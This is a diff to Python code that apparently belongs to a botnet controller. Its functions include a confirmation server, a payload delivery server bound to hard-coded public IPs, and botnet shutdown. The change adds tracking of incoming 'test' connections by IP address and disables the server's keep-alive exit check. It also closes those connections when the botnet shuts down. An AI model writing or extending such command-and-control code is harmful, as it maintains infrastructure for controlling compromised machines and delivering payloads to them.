@@ -15,6 +15,7 @@ test_bool = False
 
 keep_alive = True
 
+test_conns = {}
 #def check_bot(addr):
 #    global botnet_address
 #    for add in botnet_address:
@@ -23,15 +24,19 @@ keep_alive = True
 #    return False
 
 def start_confirmation_server(ip="159.65.11.28",port=2000):
+    global test_conns
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
     while True:
-        global keep_alive
-        if(keep_alive != True):
-            s.close()
-            return
+        # global keep_alive
+        # if(keep_alive != True):
+        #     s.close()
+        #     return
         client,addr = s.accept()
+        if(test_conns.get(str(addr[0]))):
+            continue
+        test_conns[str(addr[0])] = client
 
 
 def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
@@ -117,7 +122,10 @@ def detect_os():
         print("\n\n\n\n")
 
 def shutdown_botnet():
-    global botnet
+    global botnet,test_conns
+    for t in test_conns:
+        test_conns[t].close()
+        print("[*]Test conn to %s closed"%(t))
     for bot in botnet:
         try:
             botnet[bot].close()
